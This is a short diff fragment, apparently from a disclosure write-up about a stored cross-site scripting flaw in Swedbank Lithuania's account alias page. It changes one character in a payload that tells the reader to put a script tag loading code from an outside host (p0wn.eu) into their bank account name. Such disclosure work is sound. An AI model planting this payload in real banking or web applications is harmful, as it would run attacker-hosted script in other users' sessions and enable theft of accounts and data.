@@ -18,7 +18,7 @@ https://www.swedbank.lt/private/home/important/aliases
 
 Include following javascript code within your bank account name and save changes:
 ```
-A<script src=“//p0wn.eu”></script>
+T<script src=“//p0wn.eu”></script>
 ```
 ![Setting XSS payload](https://i.imgur.com/ITOX13M.png)
 
